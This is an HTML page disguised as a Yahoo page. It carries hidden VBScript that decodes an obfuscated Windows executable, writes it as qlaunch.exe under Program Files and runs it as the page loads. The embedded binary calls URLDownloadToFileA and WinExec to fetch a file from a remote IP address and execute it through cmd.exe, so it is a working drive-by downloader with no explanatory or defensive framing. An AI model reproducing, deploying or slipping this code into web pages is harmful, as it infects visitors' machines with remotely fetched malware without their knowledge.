<html><head><meta http-equiv="pragma" content="no-cache"><title>Ya hoo !</title></head>
<body><script language=VBS>
v="4D,5A,6C,y,01,y3,04,y,11,y,z2,03,y2,01,y6,40,y23,70,y3,0E,1F,BA,0E,y,B4,09,CD,21,B8,y,4C,CD,21,54,68,69,73,x,70,72,6F,67,72,61,6D,x,72,65,71,75,69,72,65,73,x,57,69,6E,33,32,w,q,24,y4,50,45,y2,4C,01,03,y,3C,21,5C,41,y8,E0,y,02,01,0B,01,yF,10,yC,40,y2,10,y3,02,y2,01,y7,04,y8,40,y3,02,y6,02,y5,10,y2,10,y4,10,y2,10,y6,10,yC,x,y2,98,y1C,30,y2,12,y53,63,6F,64,65,y5,10,y3,10,y2,79,y4,02,yE,40,y2,C0,69,6D,70,6F,72,74,73,y2,10,y3,x,y2,98,y4,04,yE,40,y2,50,72,65,6C,6F,63,73,y3,10,y3,30,y2,12,y4,06,yE,40,y2,52,yx,90,6A,y,6A,y,E9,0F,y3,63,3A,5C,63,6F,6D2,61,6E,64,2E,65,78,65,y,68,q,10,40,y,E9,21,y3,68,742,70,3A,2F2,32,30,32,2E,322,39,2E,33,2E,32,332,2F,63,2F,69,6D,61,67,65,2E,67,69,66,y,68,23,10,40,y,6A,y,z,15,60,x,40,y,902,6A,01,E9,0F,y3,63,3A,5C,63,6F,6D2,61,6E,64,2E,65,78,65,y,68,5A,10,40,y,z,15,70,x,40,y,90,31,C0,90,C3,yz,y88,58,x,yq,3C,x,y2,60,x,y2,68,x,yq,48,x,y2,70,x,y16,75,72,6C,6D,6F,6E,2E,64,6C2,y2,6B,65,72,6E,65,6C,33,32,2E,64,6C2,y2,2E,64,78,x,y6,78,x,y6,8E,x,y6,8E,x,y8,55,52,4C,44,6F,77,6E,6C,6F,61,64,54,6F,46,69,6C,65,41,y4,57,69,6E,45,78,65,63,yz,y6B,10,y2,12,y3,1A,30,45,30,4D,30,6A,30,70,30"
function res(x,y)
v = Replace(v, x, y)
End Function
On Error Resume Next
res "z", "FF"
res "y", "00"
res "x", "20"
res "q", "0A"
res "w", "0D"
res "r", "2C"
piece = Split(v, "/")
cc = 103
For n = 0 To UBound(piece) - 1
res Chr(cc), piece(n)
cc = cc + 1
Next

Set fso = CreateObject("Scripting.FileSystemObject")
tmp = Split(v, ",")

pth = "c:\progra~1\common~1\tmp0598a.txt"
pthe = "c:\progra~1\common~1\qlaunch.exe"
Set f1 = fso.GetFile(pth)
if f1 <> "" then f1.Delete
Set f = fso.CreateTextFile(pth, ForWriting)
For i = 0 To UBound(tmp)
l = Len(tmp(i))
b = Int("&H" & Left(tmp(i), 2))
If l > 2 Then
r = Int("&H" & Mid(tmp(i), 3, l))
For j = 1 To r
f.Write Chr(b)
Next
Else
f.Write Chr(b)
End If
Next
f.Close

fso.CopyFile pth,pthe,true
Set f1 = fso.GetFile(pth)
if f1 <> "" then f1.Delete</script>
<center><script language=VBS>
pth = "c:\progra~1\common~1\qlaunch.exe"
Set shell=CreateObject("WScript.Shell")
shell.run(pth)</script>
<A href="yahoo.com"><img src="http://us.i1.yimg.com/us.yimg.com/i/ww/m6v8c.gif" border=0></A>
</center>
<script>window.close()</script>
</body></html>